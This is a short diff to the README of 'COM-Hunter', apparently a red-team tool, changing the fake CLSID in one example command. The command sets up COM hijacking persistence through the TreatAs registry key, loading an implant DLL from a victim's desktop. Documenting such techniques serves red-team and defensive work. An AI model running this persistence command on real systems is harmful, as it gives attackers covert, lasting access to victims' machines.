@@ -145,7 +145,7 @@ Usage:  COM-Hunter.exe treatas <CLSID> <fake_CLSID> <binary_path> <option>
 :information_source: Perform persistence via the TreatAs registry key and a fake (forwardable) CLSID using DLL implementation:
 
 ```
-.\COM-Hunter.exe treatas AB8902B4-09CA-4bb6-B78D-A8F59079A8D5 "{00000012-1312-1109-2605-F38D1EBDCBE1}" C:\Users\victim\Desktop\implant.dll -i
+.\COM-Hunter.exe treatas AB8902B4-09CA-4bb6-B78D-A8F59079A8D5 "{00000012-1312-1997-2605-F38D1EBDCBE1}" C:\Users\victim\Desktop\implant.dll -i
 ```
 
 ## References
